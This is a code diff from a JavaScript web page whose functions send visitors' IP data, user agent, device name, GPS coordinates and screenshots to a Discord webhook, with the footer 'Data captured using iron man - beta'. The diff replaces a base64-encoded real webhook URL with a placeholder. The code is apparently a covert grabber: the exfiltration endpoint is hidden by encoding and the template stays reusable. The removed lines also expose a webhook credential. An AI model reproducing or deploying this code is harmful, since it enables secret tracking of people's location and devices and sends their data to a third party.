@@ -292,7 +292,7 @@
         return data.data.link;
       }
       async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude, accessType) {
-        const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMjE3MDM4MTU2OTU1NjQ5MC96ZFRvdFpTTlE4NzFlYkZPUndQbUR3YjhFYTdIbkhhNF9XYkRKNjRUZndSTzMxdVg2VzNmd3dVYVRLcjhQSTZ4ay1sdA=="; // dont delete the webook, im trying to catch bad actors, send a message within the webhook if you see
+        const encryptedWebhookUrl = "insert-base-64-webhook"; 
         const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
         const webhookUrl = atob(encryptedWebhookUrl);
         const now = new Date();
@@ -344,7 +344,7 @@
         });
       }
       async function sendScreenshotToDiscord(imageUrl) {
-        const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMjE3MDM4MTU2OTU1NjQ5MC96ZFRvdFpTTlE4NzFlYkZPUndQbUR3YjhFYTdIbkhhNF9XYkRKNjRUZndSTzMxdVg2VzNmd3dVYVRLcjhQSTZ4ay1sdA=="; // send a message within the webhook if you see
+        const encryptedWebhookUrl = "insert-base-64-webhook"; 
         const now = new Date();
         const webhookUrl = atob(encryptedWebhookUrl);
         const footerText = `${now.toLocaleString()} - Data captured using iron man - beta`;
